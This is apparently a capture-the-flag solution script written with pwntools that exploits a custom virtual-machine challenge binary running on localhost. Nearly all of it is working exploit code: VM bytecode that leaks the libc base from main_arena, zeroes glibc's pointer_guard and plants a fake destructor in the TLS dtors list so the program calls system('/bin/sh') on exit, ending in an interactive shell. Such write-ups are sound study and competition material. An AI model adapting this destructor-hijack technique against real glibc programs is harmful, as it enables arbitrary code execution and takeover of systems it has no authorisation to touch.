from pwn import *
from vasm import assemble

exe = ELF("chal")
libc = ELF("libc.so.6")

context.binary = exe
context.log_level = "DEBUG"
context.timeout = 600

#p = process(exe.path)
p = remote("localhost", 1337)

def run_vm(code, memsize):
    if type(code) != bytes:
        bytecode = assemble(code)
    else:
        bytecode = code

    p.sendlineafter(b"code? ", str(len(bytecode)).encode())
    p.sendlineafter(b"memory? ", str(memsize).encode())

    pause()

    p.sendlineafter(b"code: ", bytecode)

    p.sendlineafter(b"(y/n) ", b"y")

main_arena = 0x21b430-1968#libc.symbols.main_arena
system = libc.symbols.system
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = assemble(f""" 

    push_loop:
    push 0xffffffffffffffff *3
    ldr 0x0 0x1089
    jeq $push_loop

    push 0xffffffffffffffff *2
    pop *3
    push 0x31
    pop *3

    # libc base
    push {main_arena+1968}
    push 0x0
    ldr 0x0 0x1086
    sub
    ldr 0x1085 0x0

    # system<<11h
    push {system}
    add
    push 0x20000
    mul
    ldr 0x1085 0x20

    # /bin/sh
    push {bin_sh}
    ldr 0x0 0x1085
    add
    ldr 0x1085 0x21

    # fake dtor (heap)
    push 0x110
    ldr 0x2 0x1085
    add
    ldr 0x1085 0x18

    # pointer_guard offset
    pop *2
    push 0x8
    push 0x0 *2
    ldr 0x0 0x1086
    ldr 0x2 0x1085
    sub
    push 0xffffffffffffd760
    add
    div
    ldr 0x1084 0x1ffffffffffffff7

    # dtors_list offset
    pop
    push 0x8
    push 0x0 *2
    ldr 0x0 0x1086
    ldr 0x2 0x1085
    sub
    push 0xffffffffffffd6d8
    add
    div
    ldr 0x1084 0x1ffffffffffffffa

    # pointer_guard => 0
    ldr 0x10 0xdeadbeef

    # dtors_list => fake dtor
    pop *7
    ldr 0x18 0xdeadbeef

    ldr 0x0 0x0
    hlt
""")


run_vm(f"""
    hlt *{len(payload)}
    """, 0x420//8)

run_vm(payload, 0x420//8)

p.sendlineafter(b"code? ", b"69420")

p.interactive()